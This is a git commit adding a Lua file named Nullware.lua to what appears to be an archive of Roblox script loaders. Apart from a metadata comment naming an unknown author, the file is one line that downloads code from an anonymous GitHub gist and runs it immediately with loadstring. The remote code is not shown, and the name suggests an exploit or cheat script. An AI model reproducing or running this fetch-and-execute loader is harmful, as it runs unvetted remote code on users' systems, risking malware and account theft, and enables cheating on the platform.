71f99b4509fd18c59792bf315ddfa3fa28ba2586
timedmarch <59752762+CenteredSniper@users.noreply.github.com>
2024-05-20 05:17:57 -0700

    Create Nullware.lua

---
+++ Archive/Loadstrings/Nullware.lua
@@ -0,0 +1,8 @@
+--[[ // METADATA
+
+Last Modified: 5/15/2021 4:50PM
+Author: ???
+
+--]]
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP"))()
